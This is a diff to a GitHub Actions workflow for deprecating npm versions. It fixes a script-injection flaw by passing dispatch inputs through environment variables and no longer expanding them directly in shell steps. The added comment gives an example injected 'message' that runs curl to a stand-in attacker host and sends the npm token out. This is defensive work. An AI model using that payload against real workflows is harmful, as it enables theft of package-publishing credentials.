@@ -27,11 +27,19 @@ permissions:
 jobs:
   deprecate:
     runs-on: ubuntu-latest
+    # Dispatch inputs reach the shell through the environment, never through `${{ }}` in a `run:`
+    # body. GitHub expands an expression into the script *before* bash parses it, so a `message` of
+    # `"; curl -s https://attacker.example --data $NODE_AUTH_TOKEN #` ran as a command in a job that
+    # holds the npm token. `"$SPEC"` is a quoted variable reference: the value can only ever be an
+    # argument.
+    env:
+      SPEC: ${{ inputs.spec }}
+      MESSAGE: ${{ inputs.message }}
     steps:
       - name: Refuse a non-exact spec
         run: |
-          case "${{ inputs.spec }}" in
-            *@*.*.*) echo "deprecating ${{ inputs.spec }}" ;;
+          case "$SPEC" in
+            *@*.*.*) echo "deprecating $SPEC" ;;
             *) echo "::error::spec must be an exact version like name@1.2.3 — refusing to touch a range"; exit 1 ;;
           esac
 
@@ -43,13 +51,13 @@ jobs:
       - name: Deprecate
         env:
           NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
-        run: npm deprecate "${{ inputs.spec }}" "${{ inputs.message }}"
+        run: npm deprecate "$SPEC" "$MESSAGE"
 
       - name: Confirm the registry agrees
         run: |
           set -euo pipefail
           for attempt in 1 2 3 4 5 6; do
-            message="$(npm view "${{ inputs.spec }}" deprecated 2>/dev/null || true)"
+            message="$(npm view "$SPEC" deprecated 2>/dev/null || true)"
             if [ -n "$message" ]; then
               echo "deprecated: $message"
               exit 0
@@ -57,5 +65,5 @@ jobs:
             echo "not visible yet (attempt $attempt); waiting for replication"
             sleep 20
           done
-          echo "::error::the registry still reports no deprecation for ${{ inputs.spec }}"
+          echo "::error::the registry still reports no deprecation for $SPEC"
           exit 1
